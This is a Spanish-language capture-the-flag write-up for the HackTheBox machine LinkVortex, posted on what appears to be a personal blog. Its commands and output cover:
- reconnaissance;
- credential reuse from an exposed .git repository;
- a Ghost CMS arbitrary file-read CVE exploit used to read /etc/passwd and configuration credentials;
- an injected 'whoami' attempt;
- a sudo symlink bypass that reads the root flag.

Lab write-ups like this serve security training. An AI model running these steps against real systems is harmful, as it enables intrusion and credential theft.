<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>LinkVortex | Cybersecurity Borhub Home</title>
<meta name="keywords" content="">
<meta name="description" content="
Reconocimiento
Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports
[sudo] contraseña para borhub:
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST
Initiating SYN Stealth Scan at 14:48
Scanning 10.10.11.47 [65535 ports]
Discovered open port 22/tcp on 10.10.11.47
Discovered open port 80/tcp on 10.10.11.47
Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports)
Nmap scan report for 10.10.11.47
Host is up, received user-set (0.036s latency).
Scanned at 2025-04-06 14:48:30 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
Read data files from: /usr/bin/../share/nmap

Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB)
Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.">
<meta name="author" content="">
<link rel="canonical" href="https://borhuub.github.io/write-ups/linux/easy/linkvortex/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6270c07b3c3877be7938882f49d2f910770e98a737c313b1e13b936bfc90a051.css" integrity="sha256-YnDAezw4d755OIgvSdL5EHcOmKc3wxOx4TuTa/yQoFE=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://borhuub.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://borhuub.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://borhuub.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://borhuub.github.io/write-ups/linux/easy/linkvortex/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://borhuub.github.io/write-ups/linux/easy/linkvortex/">
  <meta property="og:site_name" content="Cybersecurity Borhub Home">
  <meta property="og:title" content="LinkVortex">
  <meta property="og:description" content="
Reconocimiento Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST Initiating SYN Stealth Scan at 14:48 Scanning 10.10.11.47 [65535 ports] Discovered open port 22/tcp on 10.10.11.47 Discovered open port 80/tcp on 10.10.11.47 Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports) Nmap scan report for 10.10.11.47 Host is up, received user-set (0.036s latency). Scanned at 2025-04-06 14:48:30 CEST for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB) Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="write-ups">
    <meta property="article:published_time" content="2025-09-11T12:00:00+00:00">
    <meta property="article:modified_time" content="2025-09-11T12:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="LinkVortex">
<meta name="twitter:description" content="
Reconocimiento
Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports
[sudo] contraseña para borhub:
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST
Initiating SYN Stealth Scan at 14:48
Scanning 10.10.11.47 [65535 ports]
Discovered open port 22/tcp on 10.10.11.47
Discovered open port 80/tcp on 10.10.11.47
Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports)
Nmap scan report for 10.10.11.47
Host is up, received user-set (0.036s latency).
Scanned at 2025-04-06 14:48:30 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
Read data files from: /usr/bin/../share/nmap

Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB)
Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://borhuub.github.io/write-ups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Linux",
      "item": "https://borhuub.github.io/write-ups/linux/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Writeups Linux - Nivel Easy",
      "item": "https://borhuub.github.io/write-ups/linux/easy/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "LinkVortex",
      "item": "https://borhuub.github.io/write-ups/linux/easy/linkvortex/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LinkVortex",
  "name": "LinkVortex",
  "description": "\nReconocimiento Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST Initiating SYN Stealth Scan at 14:48 Scanning 10.10.11.47 [65535 ports] Discovered open port 22/tcp on 10.10.11.47 Discovered open port 80/tcp on 10.10.11.47 Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports) Nmap scan report for 10.10.11.47 Host is up, received user-set (0.036s latency). Scanned at 2025-04-06 14:48:30 CEST for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB) Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.\n",
  "keywords": [
    
  ],
  "articleBody": "\nReconocimiento Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST Initiating SYN Stealth Scan at 14:48 Scanning 10.10.11.47 [65535 ports] Discovered open port 22/tcp on 10.10.11.47 Discovered open port 80/tcp on 10.10.11.47 Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports) Nmap scan report for 10.10.11.47 Host is up, received user-set (0.036s latency). Scanned at 2025-04-06 14:48:30 CEST for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB) Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.\n❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! Una vez tenemos los puertos copiados vamos a volver a usar nmap pero esta vez para hacer un escaneo de los servicios que están corriendo tras los puertos.\n❯ sudo nmap -sCV -p22,80 10.10.11.47 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:50 CEST Nmap scan report for 10.10.11.47 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA) |_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://linkvortex.htb/ |_http-server-header: Apache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds Enumeración web ❯ whatweb 10.10.11.47 http://10.10.11.47 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.47], RedirectLocation[http://linkvortex.htb/], Title[301 Moved Permanently] http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge] Vamos a empezar a enumerar directorios con gobuster y de aquí lo más interesante que encontramos es un panel de login en /ghost.\n❯ gobuster dir -u http://linkvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://linkvortex.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /about (Status: 200) [Size: 8284] /rss (Status: 200) [Size: 26682] /feed (Status: 200) [Size: 26682] /About (Status: 200) [Size: 8284] /RSS (Status: 200) [Size: 26682] /private (Status: 200) [Size: 12148] /unsubscribe (Status: 400) [Size: 24] /LICENSE (Status: 200) [Size: 1065] /cpu (Status: 200) [Size: 15472] /Rss (Status: 200) [Size: 26682] /ram (Status: 200) [Size: 14746] /ghost (Status: 200) [Size: 3787] /psu (Status: 200) [Size: 15163] /Private (Status: 200) [Size: 12148] /Feed (Status: 200) [Size: 26682] /Ghost (Status: 200) [Size: 3787] /RAM (Status: 200) [Size: 14746] /vga (Status: 200) [Size: 15231] /CPU (Status: 200) [Size: 15472] /VGA (Status: 200) [Size: 15231] Progress: 55968 / 220560 (25.38%)^C [!] Keyboard interrupt detected, terminating. Progress: 55970 / 220560 (25.38%) [ERROR] context canceled =============================================================== Finished =============================================================== He estado mirando pero por el momento como no he encontrado ninguna vulnerabilidad en el panel, voy a seguir enumerando pero esta vez subdominios. Aquí conseguimos enumerar el subdominio dev.linkvortex.htb\nNos sale un cartel diciendo que la página aún esta en construcción, nosotros por el momento vamos a hacerle un listado de directorios para ver si sacamos algo más de información.\nEn un principio no me listaba nada con diretorios y he estado probando diccionarios hasta que he probado uno sobre metafiles y me ha descubierto el directorio .git/.\n❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt:FUZZ -u http://dev.linkvortex.htb/FUZZ -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://dev.linkvortex.htb/FUZZ :: Wordlist : FUZZ: /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 403 ________________________________________________ .git/packed-refs [Status: 200, Size: 147, Words: 8, Lines: 4, Duration: 103ms] .git/description [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 103ms] .git/logs/HEAD [Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 103ms] .git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms] .git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 103ms] .git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 102ms] .git/ [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 102ms] .git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 103ms] :: Progress: [118/118] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:01] :: Errors: 0 :: Para trabajar mejor con un entorno git y ver si encuentro algo interesante voy a dumperame el git a mi maquina local para navegar cómodamente.\n❯ python3 -m venv entorno_virtual source entorno_virtual/bin/activate pip install git-dumper cd /home/borhub/Workspace/HTB/linkvortex/CONTENT/git/entorno_virtual git-dumper http://dev.linkvortex.htb/.git ./git Luego de haber estado buscando un buen rato he encontrado lo que podrían ser unas credenciales en /ghost/core/test/regressions/api/admin/authentication.test.js\nit('complete setup', async function () { const email = 'test@example.com'; const password = 'OctopiFociPilfer45'; Aquí realmente solo tenemos un ejemplo de contraseña pero antes habíamos visto en la web que un usuario llamado admin tenia varias publicaciones.\nCon lo cual vamos a probar con el nombre de usuario + el dominio de la pagina web, junto con la contraseña que hemos visto en los archivos del .git/. Y así entramos al dashboard de la pagina web.\nAcceso inicial CVE-2023-40028: Ghost CMS Arbitrary File Read En el whatweb anterior veíamos la versión de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.\nGhost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.\nhttps://github.com/godylockz/CVE-2023-40028/tree/main\nUtilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuración en el cual hay unas credenciales también.\n❯ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45 [*] Checking authentication (username/password) ... [+] Admin session created successfully. Welcome to the Ghost file-read shell. Type help or ? to list commands. file\u003e /var/lib/ghost/config.production.json { \"url\": \"http://localhost:2368\", \"server\": { \"port\": 2368, \"host\": \"::\" }, \"mail\": { \"transport\": \"Direct\" }, \"logging\": { \"transports\": [\"stdout\"] }, \"process\": \"systemd\", \"paths\": { \"contentPath\": \"/var/lib/ghost/content\" }, \"spam\": { \"user_login\": { \"minWait\": 1, \"maxWait\": 604800000, \"freeRetries\": 5000 } }, \"mail\": { \"transport\": \"SMTP\", \"options\": { \"service\": \"Google\", \"host\": \"linkvortex.htb\", \"port\": 587, \"auth\": { \"user\": \"bob@linkvortex.htb\", \"pass\": \"fibber-talented-worth\" } } } } file\u003e Probamos a meter las credenciales obtenidas por ssh y obtenemos la terminal.\n❯ ssh bob@10.10.11.47 bob@10.10.11.47's password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Apr 6 17:56:25 2025 from 10.10.14.74 bob@linkvortex:~$ cat user.txt 2c7f66b6d4d0******************** Escalada de privilegios Cuando hacemos sudo -l vemos que nuestro usuario tiene permiso para ejecutar un archivo .sh como administrador sin necesidad de poner contraseña adjuntado un archivo acabado en .png.\nbob@linkvortex:/opt/ghost$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png En un principio he intentado ejecutar comandos luego del archivo .png, pero detecta el uso de un segundo comando y es ahí cuando me pide la contraseña y ya el código no me deja ejecutar el comando.\nbob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh \"prueba.png; whoami\" [sudo] password for bob: Sorry, user bob is not allowed to execute '/usr/bin/bash /opt/ghost/clean_symlink.sh prueba.png; whoami' as root on linkvortex. Symlink Trickery y Abuso de CHECK_CONTENT Luego de revisar el código vi que el script revisa si el link simbólico del archivo .png para comprobar si contiene archivos sensibles como root o etc.\nCon lo cual para evitar esto vamos a hacer un bypass para engañar el filtro. Lo que haremos será lo siguiente hacer que el archivo al que apunta el .png sea un archivo cualquiera que luego apunta a /root/root.txt.\nhit-png -\u003e /home/bob/hit.txt | /home/bob/hit.txt -\u003e /root/root.txt\nbob@linkvortex:~$ ln -s /root/root.txt hit.txt bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.\nSi ahora ejecutamos el script funcionará pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.\n#codigo del script y porque no nos muestra el contenido if $CHECK_CONTENT;then /usr/bin/echo \"Content:\" /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u003e/dev/null fi bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Entonces le indicamos en el script que ponga el CHECK_CONTENT en true para que nos muestre la flag.\nbob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Link found [ /home/bob/hit.png ] , moving it to quarantine Content: 46df14************************** bob@linkvortex:~$ ",
  "wordCount" : "1598",
  "inLanguage": "en",
  "datePublished": "2025-09-11T12:00:00Z",
  "dateModified": "2025-09-11T12:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://borhuub.github.io/write-ups/linux/easy/linkvortex/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Cybersecurity Borhub Home",
    "logo": {
      "@type": "ImageObject",
      "url": "https://borhuub.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://borhuub.github.io/" accesskey="h" title="Cybersecurity Borhub Home (Alt + H)">Cybersecurity Borhub Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://borhuub.github.io/" title="Inicio">
                    <span>Inicio</span>
                </a>
            </li>
            <li>
                <a href="https://borhuub.github.io/write-ups/" title="Write-Ups">
                    <span>Write-Ups</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      LinkVortex
    </h1>
    <div class="post-meta"><span title='2025-09-11 12:00:00 +0000 UTC'>September 11, 2025</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
                <li>
                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a></li>
                <li>
                    <a href="#acceso-inicial" aria-label="Acceso inicial">Acceso inicial</a><ul>
                        
                <li>
                    <a href="#cve-2023-40028-ghost-cms-arbitrary-file-read" aria-label="CVE-2023-40028: Ghost CMS Arbitrary File Read">CVE-2023-40028: Ghost CMS Arbitrary File Read</a></li></ul>
                </li>
                <li>
                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
                        <ul>
                        
                <li>
                    <a href="#symlink-trickery-y-abuso-de-check_" aria-label="Symlink Trickery y Abuso de CHECK_CONTENT">Symlink Trickery y Abuso de CHECK_CONTENT</a>
                </li>
            </ul>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img alt="LinkVortex" loading="lazy" src="fotos/linkvortex.png"></p>
<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
<p>Vamos a empezar el reconocimiento con un <code>Nmap</code> para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado <code>ports</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.47 -oG ports
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para borhub:
</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-06 14:48 CEST
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 14:48
</span></span><span style="display:flex;"><span>Scanning 10.10.11.47 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.47
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.47
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 14:48, 10.90s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.47
</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2025-04-06 14:48:30 CEST <span style="color:#66d9ef">for</span> 11s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT STATE SERVICE REASON
</span></span><span style="display:flex;"><span>22/tcp open ssh syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>80/tcp open http syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.95 seconds
</span></span><span style="display:flex;"><span>Raw packets sent: <span style="color:#ae81ff">65672</span> <span style="color:#f92672">(</span>2.890MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65535</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ports.py ports
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>🔍 Puertos encontrados:
</span></span><span style="display:flex;"><span>➜ <span style="color:#ae81ff">22</span>
</span></span><span style="display:flex;"><span>➜ <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>¡Puertos copiados en el portapapeles!
</span></span></code></pre></div><p>Una vez tenemos los puertos copiados vamos a volver a usar nmap pero esta vez para hacer un escaneo de los servicios que están corriendo tras los puertos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -sCV -p22,80 10.10.11.47 -oN targeted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-06 14:50 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.47
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.29s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">256</span> 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">256</span> a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open http Apache httpd
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://linkvortex.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: Apache
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
